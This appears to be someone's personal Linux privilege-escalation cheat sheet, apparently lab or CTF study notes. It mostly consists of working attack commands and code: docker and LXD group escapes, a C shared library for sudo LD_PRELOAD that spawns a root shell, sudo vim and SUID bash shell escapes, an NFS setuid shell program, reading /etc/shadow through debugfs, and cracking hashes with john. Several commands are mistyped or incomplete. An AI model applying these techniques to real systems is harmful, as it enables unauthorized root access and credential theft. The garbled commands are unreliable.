
1) Credentials access

2) Exploits

3) Missconfiguration

---------------------------------------------------------------------------
1) Credentials access: 
	a) reuse password (use all passwords which was already used )
	b) configuration files
	c) local dabase
	d) bash history
	e) ssh keys
	f) sudo access
	g) group priviliges (docker, LXD ,...)
	
2) Exploit:
	a) service running on localhost
	b) kernel version
	c) binary file version - strange binarys or old,outstanding etc 

3) misconfiguration
	a) cron jobs : 
			- writable cron jobs
			- writable cron dependencys (files , python libs etc)
	b) SUID/SGID files
	c) Interesting capabilities on binary (suid capabilities)
	d) sensitive files writable (shadow, passwd, sudoers, configuration files)
	e) sensitive files readable (shadow, /root/.ssh/id_rsa -> ssh priv key)
	f) writable PATH - cron job uses sth like 'cat 'PATH ... ' you van write PATH
	g) LD_PRELOAD set in /etc/sudoers
	


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
config files: (search hidden files in config dir , example : .htusers.php)
	www-data@dora:/var/www/html/filemanager/config$ ls -all
--------------------------------------------------------------------------------------------------------------------------------------------------------
check id:
	dora@dora:/etc$ id
	id
	uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

	in this situation can check: 
		dora@dora:/etc$ df -h
		..
		/dev/mapper/ubuntu--vg-ubuntu--lv
		..

	use it to check all files:
		dora@dora:/etc$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
		debugfs:  cat /etc/shadow



--------------------------------------------------------------------------------------------------------------------------------------------------------
docker:
	if we are in doker group 
	user@ubuntu:/$ groups
	somepriv docker	
	user@ubuntu:/$ docker run -v/:/mnt -it alpine 
	/ # cd mnt 
	
	
	(now you can rmove root password or set different pasword in shadow file etc )
--------------------------------------------------------------------------------------------------------------------------------------------------------
LXD group:
	user@ubuntu:/$ groups
	somepriv lxd
		
	user@ubuntu:/$ lxc image list

	ALIAS     ...
	privesc   ...
	
	user@ubuntu:/$ lxc init privesc privesc-container -c security.priviliged=true 
	
 	user@ubuntu:/$ lxc list
		privesc-container  STOPPED
		
 	user@ubuntu:/$ lxc config device add privesc-container MyDeviceSthgBle disk source=/mnt/root recursive=true 
	
	
	user@ubuntu:/$ lxc start privesc-container
	
 	user@ubuntu:/$ lxc list
		privesc-container  RUNNING
		
 	user@ubuntu:/$ lxc exec privesc-container /bin/sh
 	
 	# cd /mnt/root/
		
		
	(now you can rmove root password or set different pasword in shadow file etc) 	
--------------------------------------------------------------------------------------------------------------------------------------------------------
Sudo  + LD_PRELOAD

	cat /etc/sudoers
	
	you can create program to make shared library

	shell.c:
	
	--------------------------------------------------
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	void _init()
	{
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/sh");
	}
	--------------------------------------------------
	
	compile:
		user@ubuntu:$ cc -fPIC -shared -o shell.so shell.c -nostartfiles


	user@ubuntu:$sudo -l
	....
	env_keep+=LD_PRELOAD
	..
	(ALL) /us/bin/ping
		

	(if we have env_keep and some sudo ALL file like ping we can use it ) 
	
	user@ubuntu:$ do LDPRELOAD=/tmp/shell.so /usr/bin/ping
	# whoami
	root
	
--------------------------------------------------------------------------------------------------------------------------------------------------------
SUDO access

	etc 1:
	user@ubuntu:$sudo -l
	....
	(ALL : ALL) ALL
	
	user@ubuntu:$sudo -i 
	root@ubuntu:~#
	-----------------------------
	
	etc 2:
	user@ubuntu:$sudo -l
	...
	(ALL) NOPASSWD: /usr/bin/vim	
	
	user@ubuntu:$sudo vim	
			in vim in command mode:
			:!/bin/bash
	

	https://gtfobins.github.io/

--------------------------------------------------------------------------------------------------------------------------------------------------------	
Exploiting SUID:
	
	etc1 (basic):
	user@ubuntu:$sudo chmod +s bash
	user@ubuntu:$ls -ls
	(-rws-sr-x) root ....  bash

	now run bash with priviligest
	user@ubuntu:$./bash -p   
	bash-4.4# whoami
	root
	-------------------------------------
		
	etc2:
	user@ubuntu:$find / -prem /4000 2>/dev/null
	.... 
	....
	....
	
	
	https://gtfobins.github.io/
		
--------------------------------------------------------------------------------------------------------------------------------------------------------
NFS no_root_squash: (i do not get it now)
	in file exports /exports  IP ... (rw,sync,no_root_squash)

	we can go to /mnt/nfs and create file 
	
	user@ubuntu:$touch test	
	if the owner is the user not nobody nogrup that means that we can exploit 
		
		
	#include <stdio.h>
	#include <stdlib.h>
	#include <sys/types.h>	
	#include <unistd.h>

	int main(){
	setuid(0);
	system("/bin/bash");
	return 0
	}
	
	gcc ./suid-shell.c -o suid	
	#chmod u+s suid	
		
		
--------------------------------------------------------------------------------------------------------------------------------------------------------	
Kernel Explots:
	uname -a	
	shearch in exploit-db or google , compile gcc and run... (use -m32 or not ... depends on system etc)

--------------------------------------------------------------------------------------------------------------------------------------------------------		
cracking hashes in /etc/shadow
	file  looks like: 	user:hash:18

	user@ubuntu:$ unshadow passwd.txt shadow.txt > johnFile	
	user@ubuntu:$ john johnFile --wordlist=/usr/share/wordlist/rockyou.txt
	
	output in johnFile
--------------------------------------------------------------------------------------------------------------------------------------------------------
Writable Root PATH:
	if cron job use smth like cat command etc you can play with PATH

	user@ubuntu:$	
test if you can write to bin directory if cron is using comand from it
	user@ubuntu:$ touch /bin/a
	user@ubuntu:$ chmod +x /bin/cat
	user@ubuntu:$	
	
